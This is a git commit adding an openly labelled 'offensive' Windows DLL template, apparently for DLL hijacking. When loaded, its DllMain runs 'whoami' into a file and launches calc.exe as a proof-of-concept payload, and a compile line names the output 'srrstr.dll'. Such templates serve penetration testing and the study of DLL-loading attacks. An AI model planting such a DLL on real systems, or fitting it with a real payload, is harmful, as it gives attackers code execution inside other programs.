429de5d489b1bfeaa902e88b77cdf0c6d98aa625
Andrew Trube <trube510@protonmail.com>
2022-01-29 20:45:10 -0800

    Initial Commit

---
+++ src/template-offensive-dll.cpp
@@ -0,0 +1,18 @@
+// Tested in Win10
+// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    switch(dwReason){
+        case DLL_PROCESS_ATTACH:
+            system("whoami > C:\\users\\username\\whoami.txt");
+            WinExec("calc.exe", 0); //This doesn't accept redirections like system
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return TRUE;
+}
